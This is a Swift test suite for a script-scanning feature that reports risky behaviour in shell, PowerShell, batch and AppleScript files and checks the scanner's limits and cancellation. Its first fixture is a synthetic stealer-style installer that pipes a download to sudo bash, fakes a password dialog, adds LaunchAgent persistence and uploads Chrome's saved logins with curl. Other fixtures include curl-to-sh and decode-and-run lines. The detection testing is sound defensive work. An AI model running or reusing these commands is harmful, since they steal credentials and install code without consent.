import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

// Whole scripts, and the bounds that keep the lens cheap and cancellable on hostile input.

@Suite("Script effects: realistic scripts")
struct ScriptEffectsRealisticTests {
    @Test func aMixedInstallerReportsEverythingItDoes() throws {
        let text = """
        #!/bin/bash
        # Installer for Example Tool (synthetic fixture)
        set -euo pipefail

        INSTALL_DIR="/usr/local/bin"
        echo "Installing to $INSTALL_DIR (needs sudo)"
        curl -fsSL https://example.com/tool.sh | sudo bash
        xattr -dr com.apple.quarantine "$INSTALL_DIR/tool"
        cp com.example.tool.plist ~/Library/LaunchAgents/
        launchctl load -w ~/Library/LaunchAgents/com.example.tool.plist
        echo 'export PATH="$PATH:/usr/local/bin"' >> ~/.zshrc
        PW=$(osascript -e 'text returned of (display dialog "Password" default answer "" with hidden answer)')
        echo "$PW" | sudo -S -v
        cp "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" /tmp/ld
        curl -F "file=@/tmp/ld" https://example.com/upload
        """
        let facts = try ScriptFixture.facts(text)
        #expect(facts == [
            .downloadAndRun(1, at: [7]), .quarantine(1, at: [8]), .password(2, at: [12, 13]), .secrets(1, at: [14]),
            .persistence(3, at: [9, 10, 11]), .elevates(2, at: [7, 13]), .uploads(1, at: [15])
        ])
    }

    @Test func aBuildScriptIsSilent() throws {
        let text = """
        #!/bin/bash
        # Build and test. Run with: ./build.sh [--release]
        set -euo pipefail
        cd "$(dirname "$0")"

        CONFIG=debug
        if [[ "${1:-}" == "--release" ]]; then CONFIG=release; fi
        echo "Building ($CONFIG); you may need sudo for the install step"

        usage() {
          cat <<EOF
        Usage: build.sh [--release]
        Install with: sudo make install
        Download: curl -fsSL https://example.com/tool.sh | sh
        EOF
        }

        swift build -c "$CONFIG" 2>&1 | tee build.log
        swift test --parallel
        for f in Sources/*/*.swift; do
          [ -s "$f" ] || { echo "empty: $f"; exit 1; }
        done
        VERSION=$(git describe --tags --always)
        curl -s "https://api.example.com/latest?v=$VERSION" -o latest.json
        jq -r '.name' latest.json | tr a-z A-Z
        tar czf "dist/tool-$VERSION.tgz" -C .build/release tool
        shasum -a 256 dist/*.tgz > dist/SHA256SUMS
        scp dist/*.tgz build@example.com:/srv/releases/
        rsync -a dist/ build@example.com:/srv/releases/
        git push origin main --tags
        export PATH="$PATH:$HOME/.local/bin"
        trap 'rm -f build.log' EXIT
        echo "done"
        """
        #expect(try ScriptFixture.facts(text) == [])
    }

    @Test func aPowerShellScriptIsSilent() throws {
        let text = """
        <#
        .SYNOPSIS
        Builds the project. Never runs: iex (irm https://example.com/x)
        #>
        param([string]$Configuration = "Debug")
        $ErrorActionPreference = "Stop"
        Write-Host "Building $Configuration"
        $version = (git describe --tags --always)
        Invoke-WebRequest "https://example.com/tool.zip" -OutFile "tool.zip"
        Expand-Archive tool.zip -DestinationPath tools -Force
        $json = Invoke-RestMethod https://api.example.com/latest | ConvertTo-Json
        Set-Content -Path latest.json -Value $json
        Get-ChildItem -Recurse -Filter *.cs | ForEach-Object { $_.FullName }
        if (-not (Test-Path dist)) { New-Item -ItemType Directory dist | Out-Null }
        """
        #expect(try ScriptFixture.facts(text, language: .powerShell) == [])
    }

    @Test func aBatchFileIsSilent() throws {
        let text = """
        @echo off
        setlocal
        rem Build script. Never runs: powershell -enc AAAA
        set OUT=build
        if not exist %OUT% mkdir %OUT%
        for %%f in (src\\*.c) do cl /nologo %%f /Fo%OUT%\\
        if errorlevel 1 (
          echo Build failed
          exit /b 1
        )
        copy %OUT%\\main.exe dist\\main.exe
        echo Done: run as administrator to install
        """
        #expect(try ScriptFixture.facts(text, language: .batch) == [])
    }

    @Test func anAppleScriptIsSilent() throws {
        let text = """
        -- Opens the project folder and shows a message
        tell application "Finder"
          activate
          open folder "Projects" of home
        end tell
        display dialog "Opened. Use sudo only if asked." buttons {"OK"} default button "OK"
        """
        #expect(try ScriptFixture.facts(text, language: .appleScript) == [])
    }
}

@Suite("Script effects: bounds")
struct ScriptEffectsBoundTests {
    @Test func aFiftyThousandLineScriptCompletes() throws {
        var lines: [String] = []
        lines.reserveCapacity(50_000)
        for index in 0..<50_000 {
            switch index % 5 {
            case 0: lines.append("echo \"step \(index)\"")
            case 1: lines.append("if [ -f /tmp/x\(index) ]; then rm /tmp/x\(index); fi")
            case 2: lines.append("# comment \(index) with sudo and curl https://example.com | sh")
            case 3: lines.append("VAR\(index)=$(date +%s)")
            default: lines.append("ls -la | grep \(index) > /dev/null")
            }
        }
        lines[49_999] = "sudo true"
        let findings = try ScriptFixture.findings(lines.joined(separator: "\n") + "\n")
        #expect(findings.map(\.kind) == [.scriptElevates])
        #expect(findings.first?.lines == [50_000])
    }

    @Test(arguments: [SourceLanguageID.shell, .powerShell, .batch, .appleScript])
    func aFiftyThousandLineScriptCompletesInEveryDialect(_ language: SourceLanguageID) throws {
        let text = String(repeating: "echo ok\n", count: 50_000)
        #expect(try ScriptFixture.findings(text, language: language) == [])
    }

    @Test func aVeryLongBase64LineIsCheap() throws {
        let blob = String(repeating: "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", count: 5_000)
        // 180,000 bytes on one line, then a real finding on the next.
        let text = "echo \(blob) | base64 -d > out.bin\nsudo true\n"
        #expect(try ScriptFixture.facts(text) == [.elevates(1, at: [2])])
    }

    @Test func aLongLineIsReadWhenItFitsTheWindow() throws {
        let blob = String(repeating: "QUJDREY=", count: 4_000)
        #expect(try ScriptFixture.facts("echo \(blob) | base64 -d | sh\n") == [.decodeAndRun()])
    }

    @Test func aLongLineDoesNotSwallowTheLinesAfterIt() throws {
        // The quote opened on the long line is closed where the line is cut.
        let text = "echo \"\(String(repeating: "A", count: 200_000))\"\nsudo true\n"
        #expect(try ScriptFixture.facts(text) == [.elevates(1, at: [2])])
        let command = "x=$(\(String(repeating: "A", count: 200_000))\nsudo true\n"
        #expect(try ScriptFixture.facts(command) == [.elevates(1, at: [2])])
    }

    @Test func limitingLinesKeepsShortTextUntouched() {
        let bytes = Array("short line\nanother\n".utf8)
        bytes.withUnsafeBufferPointer { #expect(ScriptBytes.limitingLines(of: $0) == nil) }
    }

    @Test func limitingLinesCutsLongLinesAndMarksThem() {
        let line = String(repeating: "A", count: ScriptBytes.lineLimit + 10)
        let bytes = Array("\(line)\r\nok\n\(line)".utf8)
        bytes.withUnsafeBufferPointer { buffer in
            let cut = ScriptBytes.limitingLines(of: buffer)
            #expect(cut?.count == 2 * (ScriptBytes.lineLimit + 1) + 5)
            let text = String(decoding: cut ?? [], as: UTF8.self)
            #expect(text.contains("\r\nok\n"))
            #expect(cut?.filter { $0 == ScriptBytes.cutMarker }.count == 2)
        }
    }

    struct HostileCase: Sendable, CustomTestStringConvertible {
        let name: String
        let text: String
        var testDescription: String { name }
    }

    static let hostileCases: [HostileCase] = {
        var cases: [HostileCase] = []
        func add(_ name: String, _ text: String) { cases.append(HostileCase(name: name, text: text)) }
        add("nested substitutions", String(repeating: "$(", count: 5_000) + "ls" + String(repeating: ")", count: 5_000) + "\n")
        add("nested backticks", String(repeating: "`", count: 100_000) + "\n")
        add("open parentheses", String(repeating: "(", count: 100_000) + "\n")
        add("open braces", "echo ${" + String(repeating: "{", count: 50_000) + "\n")
        add("unterminated quote over many lines", "echo '" + String(repeating: "x\n", count: 30_000))
        add("unterminated double quote with substitutions", "echo \"$(" + String(repeating: "x\n", count: 30_000))
        add("unterminated here-document", "cat <<EOF\n" + String(repeating: "sudo x\n", count: 30_000))
        add("many here-documents", "cat " + String(repeating: "<<x ", count: 5_000) + "\n" + String(repeating: "x\n", count: 5_000))
        add("many continuations", String(repeating: "sudo \\\n", count: 30_000))
        add("many separators", String(repeating: "a;", count: 100_000) + "\n")
        add("many pipes", String(repeating: "curl x | ", count: 3_000) + "sh\n")
        add("many redirects", "echo " + String(repeating: ">a ", count: 5_000) + "\n")
        add("arithmetic never closed", "x=$(( 1 + " + String(repeating: "(", count: 10_000) + "\n")
        add("only line breaks", String(repeating: "\n", count: 100_000))
        var bytes = String.UnicodeScalarView()
        for value in 0..<2_000 { bytes.append(Unicode.Scalar(UInt8(value % 256))) }
        add("binary-looking bytes", String(bytes))
        return cases
    }()

    @Test(arguments: hostileCases) func hostileInputCompletes(_ scenario: HostileCase) throws {
        for language in [SourceLanguageID.shell, .fish, .powerShell, .batch, .appleScript] {
            _ = try ScriptFixture.findings(scenario.text, language: language)
        }
    }

    @Test func nestedShellStringsStopAtTheDepthLimit() throws {
        var text = "sudo true"
        for _ in 0..<6 { text = "sh -c '\(text.replacingOccurrences(of: "'", with: "'\\''"))'" }
        _ = try ScriptFixture.findings(text + "\n")
        // Within the limit the innermost command is still found.
        var shallow = "sudo true"
        for _ in 0..<2 { shallow = "sh -c '\(shallow)'" }
        #expect(try ScriptFixture.facts(shallow + "\n") == [.elevates()])
    }

    @Test func powerShellAndAppleScriptHostileInputCompletes() throws {
        let cases: [(SourceLanguageID, String)] = [
            (.powerShell, "<#" + String(repeating: "x\n", count: 30_000)),
            (.powerShell, "$x = @\"\n" + String(repeating: "iwr x | iex\n", count: 30_000)),
            (.powerShell, "iex (" + String(repeating: "(", count: 20_000)),
            (.powerShell, "\"" + String(repeating: "$(", count: 5_000)),
            (.appleScript, "(*" + String(repeating: "(* ", count: 10_000)),
            (.appleScript, "display dialog \"" + String(repeating: "x\n", count: 30_000)),
            (.appleScript, String(repeating: "¬\n", count: 30_000)),
            (.batch, String(repeating: "^\n", count: 30_000)),
            (.batch, "echo " + String(repeating: "\"", count: 100_001))
        ]
        for (language, text) in cases { _ = try ScriptFixture.findings(text, language: language) }
    }
}

@Suite("Script effects: cancellation")
struct ScriptEffectsCancellationTests {
    private static func script(for language: SourceLanguageID) -> String {
        switch language {
        case .powerShell: String(repeating: "Write-Host ok\nGet-Credential\n", count: 2_000)
        case .batch: String(repeating: "echo ok\nrunas /user:x cmd\n", count: 2_000)
        case .appleScript: String(repeating: "set x to 1\ndisplay dialog \"x\" with hidden answer\n", count: 2_000)
        default: String(repeating: "echo ok\nsudo true\n", count: 2_000)
        }
    }

    @Test(arguments: [SourceLanguageID.shell, .fish, .powerShell, .batch, .appleScript])
    func cancellationStopsTheScanAtACheckpoint(_ language: SourceLanguageID) async throws {
        let text = Self.script(for: language)
        let document = try await CancellationTest.expectStopsActiveParse(budget: .standard) { context in
            let findings = try ScriptFixture.findings(text, language: language, context: context)
            return ParsedTextDocument(text: "", findings: findings)
        }
        #expect(document.findings.count == 1)
        #expect(document.findings.first?.count == 2_000)
    }
}
